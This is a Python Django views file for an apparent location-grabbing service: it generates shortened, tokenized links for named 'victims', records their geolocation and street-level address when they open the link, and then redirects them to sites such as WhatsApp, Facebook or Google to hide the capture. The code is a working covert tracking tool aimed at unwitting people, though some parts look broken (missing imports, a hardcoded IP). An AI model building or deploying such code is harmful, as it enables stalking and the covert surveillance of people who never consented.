from django.http import HttpResponse
from django.shortcuts import render
from .models import Victim,Token,History
from locate.models import User
from geo import *
import const
from django.utils.crypto import get_random_string

def Search_By_Link(request):
	if request.is_ajax():
		phone = ""
		try:
			phone = Victim.objects.get(phone = request.GET['phone']).phone
		except Victim.DoesNotExist:
			Victim(
				name = request.GET['name'],
				phone = request.GET['phone'],
				redirect = request.GET['redirect'],
				user = User.objects.get(pk = request.session['pk_user'])
			).save()
			phone = Victim.objects.get(phone = request.GET['phone']).phone
		token = get_random_string(length=30)
		Token(
			token = token
		).save()
		user = User.objects.get(pk = request.session['pk_user'])
		if user.search_limit != 0:
			url = const.path+"/searches/register_information/"+str(token)+'/'+str(phone)+'/'+str(request.GET['redirect'])
			return HttpResponse(Shorten_Url(url))
		return HttpResponse('error')
	return render(request,'searches/link.html')

def Capture_Data(request,token,phone,url_redirect):

	url = "http://ip-api.com/json/191.95.39.31"
	data = {}
	headers = {
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    }
	response = requests.request('GET',url,headers = headers, data = data)
	resp = json.loads(response.text)
	lat = resp['lat']
	lng = resp['lon']
	urls = {
		'1':'https://web.whatsapp.com/',
		'2':'https://web.facebook.com/?_rdc=1&_rdr',
		'3':'https://www.google.com/',
		'4':'https://twitter.com/?lang=en',
		'5':'https://www.instagram.com/',
		'6':'https://web.telegram.org/',
		'7':'https://www.amazon.com/',
		'8':'https://www.mercadolibre.com.ar/',

	}
	try:
		Token.objects.get(token = token).delete()
		user = User.objects.get(pk = request.session['pk_user'])
		n = user.search_limit - 1
		user.search_limit = n
		user.save()
		data = Locate(lat,lng)
		History(
			city = data['city'],
			city_district = data['city_district'],
			country = data['country'],
			road = data['road'],
			state = data['state'],
			state_district = data['state_district'],
			suburb = data['suburb'],
			lat = lat,
			lng = lng,
			user = User.objects.get(pk = request.session['pk_user']),
			victim = Victim.objects.get(phone = phone)
		).save()
		return render(request,'capture/link.html',{'url':urls[str(url_redirect)]})
	except Token.DoesNotExist:
		print("Error")
	return HttpResponse('Error')

	

def Search_History(request):
	history = History.objects.filter(user = User.objects.get(pk = request.session['pk_user']))
	return render(request,'history/search_history.html',{'history':history})